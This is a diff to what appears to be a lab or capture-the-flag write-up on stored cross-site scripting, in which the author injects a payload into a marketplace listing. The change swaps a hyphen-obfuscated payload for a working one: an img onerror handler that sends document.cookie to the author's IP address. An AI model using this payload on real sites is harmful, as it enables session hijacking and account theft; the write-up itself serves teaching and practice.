@@ -116,7 +116,7 @@ With this in mind I Googled "cookie stealing with xss" and found [this resource]
 The payload I decided to try uses an image tag with the "onerror" property to send the victim's cookie to a webserver that I control. <br>
 I used the version without the infite loop problem, and modified it to reflect back to my IP. <br>
 
-The final payload looked like this (minus the "-" characters):"<im-g sr-c-=-x on-error=-"-this-.-src=-'-http:-//10.2.2.70/?'-+-document-.-cookie; this-.-remove-Attribute-('onerror');">". <br>
+The final payload looked like this: `"<img src=x onerror="this.src=-'http://10.2.2.70/?'+document.cookie; this.removeAttribute('onerror');">"`. <br>
 
 I made another listing, and pasted the payload into both the title and description box. <br>
 
